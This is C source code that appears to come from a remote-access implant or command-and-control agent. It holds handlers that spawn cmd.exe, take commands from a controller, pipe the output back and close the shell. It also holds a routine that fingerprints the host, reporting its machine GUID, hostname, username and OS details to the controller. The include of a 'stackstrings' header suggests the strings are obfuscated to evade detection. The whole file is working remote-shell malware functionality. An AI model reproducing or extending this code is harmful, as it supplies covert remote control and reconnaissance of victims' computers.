#include "commands.h"
#include "system_facts.h"
#include "wire.h"
#include "stackstrings.h"

DWORD Handle_ShellOpen(const agent_ctx *ctx, unsigned int corr_id, unsigned char *reply, DWORD *reply_len){
     int id = shell_open(ctx->shells);

    if (id < 0) {
        unsigned char status_error[8];
        MemoryZero(status_error, sizeof(status_error));

        int pos = 4;
        WriteU32LE(status_error, &pos, corr_id);

        MemoryCopy(reply, status_error, sizeof(status_error));
        *reply_len = sizeof(status_error);
        
        LOG_ERROR("OpenShell failed - replied status 1 (corr=%u)", corr_id);
        return STATUS_ERROR;
    }

    int pos = 0;
    WriteU32LE(reply, &pos, STATUS_OK);
    WriteU32LE(reply, &pos, corr_id);
    WriteU64LE(reply, &pos, (unsigned long long)id);

    *reply_len = 16;
    LOG_INFO("Shell with ID %d opened (cmd.exe spawned)", id);
    return STATUS_OK;
}

DWORD Handle_ShellWrite(const agent_ctx *ctx, const incoming_message *msg, unsigned int corr_id, unsigned char *reply, DWORD *reply_len){
    unsigned long long id = 0;
    for (int i = 12; i >= 5; i--)
        id = (id << 8) | msg->data[i];

    shell_slot *slot = shell_lookup(ctx->shells, id);

    int status = STATUS_ERROR;
    if (slot) {
        DWORD end = msg->length;
        while (end > 13 && msg->data[end - 1] == '\0')
            end--;
        if (end > 13 && shell_write(slot, msg->data + 13, end - 13) == 0)
            status = STATUS_OK;
    }

    int pos = 0;
    WriteU32LE(reply, &pos, (DWORD)status);
    WriteU32LE(reply, &pos, corr_id);
    *reply_len = 8;
    LOG_INFO("Write to shell %u: %lu byte(s)", (UINT32)id, (unsigned long)(msg->length - 13));
    return (DWORD)status;
}

DWORD Handle_ShellRead(const agent_ctx *ctx, const incoming_message *msg, unsigned int corr_id, unsigned char *reply, DWORD *reply_len){
        unsigned long long id = 0;
    for (int i = 12; i >= 5; i--)
        id = (id << 8) | msg->data[i];

    shell_slot *slot = shell_lookup(ctx->shells, id);
    if (!slot) {
        unsigned char status_error[8];
        MemoryZero(status_error, sizeof(status_error));

        int pos = 4;
        WriteU32LE(status_error, &pos, corr_id);
        MemoryCopy(reply, status_error, sizeof(status_error));

        *reply_len = sizeof(status_error);
        LOG_ERROR("Read shell with ID %u - unknown ID, replied status 1 (corr=%u)", (UINT32)id, corr_id);
        return STATUS_ERROR;
    }

    unsigned char chunk[8 + SHELL_READ_CHUNK + 1];
    DWORD got = 0;
    int r = shell_read(slot, chunk + 8, SHELL_READ_CHUNK, &got);

    if (r == SHELL_READ_DEAD) {
        unsigned char status_error[8];
        MemoryZero(status_error, sizeof(status_error));

        int pos = 4;
        WriteU32LE(status_error, &pos, corr_id);
        MemoryCopy(reply, status_error, sizeof(status_error));
        *reply_len = sizeof(status_error);

        LOG_ERROR("Shell %llu exited - status 1, slot freed (corr=%u)", id, corr_id);
        return STATUS_ERROR;
    }

    int pos = 0;
    WriteU32LE(chunk, &pos, STATUS_OK);
    WriteU32LE(chunk, &pos, corr_id);

    chunk[8 + got] = '\0';
    MemoryCopy(reply, chunk, 8 + got + 1);

    *reply_len = 8 + got + 1;

    if (r == SHELL_READ_IDLE)
        LOG_INFO("Read shell with ID %u - idle", (UINT32)id);
    else
        LOG_INFO("Read shell with ID %u - %lu byte(s)", (UINT32)id, (unsigned long)got);

    return STATUS_OK;
}

DWORD Handle_ShellClose(const agent_ctx *ctx, const incoming_message *msg, unsigned int corr_id, unsigned char *reply, DWORD *reply_len){
    unsigned long long id = 0;
    for (int i = 12; i >= 5; i--)
        id = (id << 8) | msg->data[i];

    shell_slot *slot = shell_lookup(ctx->shells, id);
    if (slot) {
        shell_teardown(slot);
        LOG_INFO("Shell with ID %u closed (cmd.exe terminated)", (UINT32)id);
    } else {
        LOG_INFO("Close shell with ID %u - not open (still ok)", (UINT32)id);
    }

    int pos = 0;
    WriteU32LE(reply, &pos, STATUS_OK);
    WriteU32LE(reply, &pos, corr_id);
    *reply_len = 8;
    return STATUS_OK;
}


USIZE Handle_IdentityHeaders(CHAR headers[IDENTITY_HEADERS_SIZE])
{
    hwriter w = { headers, headers + IDENTITY_HEADERS_SIZE, 1 };
    CHAR piece[64];

    BuildApiVersionHeader(piece);  WriteText(&w, piece);  WriteText(&w, "\r\n");
    BuildAgentNameIdHeader(piece); WriteText(&w, piece);  WriteText(&w, "\r\n");
    BuildPlatformHeader(piece);    WriteText(&w, piece);  WriteText(&w, "\r\n");
    BuildClientFeaturesHeaderPrefix(piece);
    WriteText(&w, piece);

    CHAR hex[] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
    CapabilityMask mask = BuildCapabilityMask();
    
    for (USIZE i = 0; w.ok && i < CAPABILITY_MASK_BYTES; i++) {
        CHAR byte[3] = {hex[mask.Bits[i] >> 4], hex[mask.Bits[i] & 0xF], '\0'};
        WriteText(&w, byte);
    }
    WriteText(&w, "\r\n");

    CHAR guid_text[40];
    if (read_machine_guid_text(guid_text)) {
        BuildMachineUuidHeaderPrefix(piece);
        WriteText(&w, piece);
        WriteText(&w, guid_text);
        WriteText(&w, "\r\n");
    }

    system_facts facts;
    collect_system_facts(&facts);

    BuildHostnameHeaderPrefix(piece);
    if (facts.hostname[0] != '\0') {
        WriteText(&w, piece);
        WriteText(&w, facts.hostname);
        WriteText(&w, "\r\n");
    }

    BuildUsernameHeaderPrefix(piece);
    if (facts.username[0] != '\0') {
        WriteText(&w, piece);
        WriteText(&w, facts.username);
        WriteText(&w, "\r\n");
    }

#if defined(ENVIRONMENT_x86_64) || defined(__x86_64__) || defined(_M_X64)
    BuildX64ArchitectureHeaders(piece);
#elif defined(ENVIRONMENT_ARM64) || defined(__aarch64__) || defined(_M_ARM64)
    BuildArm64ArchitectureHeaders(piece);
#else
    BuildI386ArchitectureHeaders(piece);
#endif
    WriteText(&w, piece);  WriteText(&w, "\r\n");

    BuildOsVersionHeaderPrefix(piece);
    if (facts.os_version[0] != '\0') {
        WriteText(&w, piece);
        WriteText(&w, facts.os_version);
        WriteText(&w, "\r\n");
    }

    BuildOsBuildHeaderPrefix(piece);
    WriteText(&w, piece);
    WriteDecimal(&w, (UINT32)ID_BUILD_NUMBER);
    WriteText(&w, "\r\n");

    BuildCommitHeaderPrefix(piece);
    BuildDefaultCommitHash(piece + 32);
    WriteText(&w, piece);
    WriteText(&w, piece + 32);
    WriteText(&w, "\r\n");

    if (!w.ok)
        return 0;

    if (w.cur >= w.end)
        return 0;
    *w.cur = '\0';
    return (USIZE)(w.cur - headers);
}
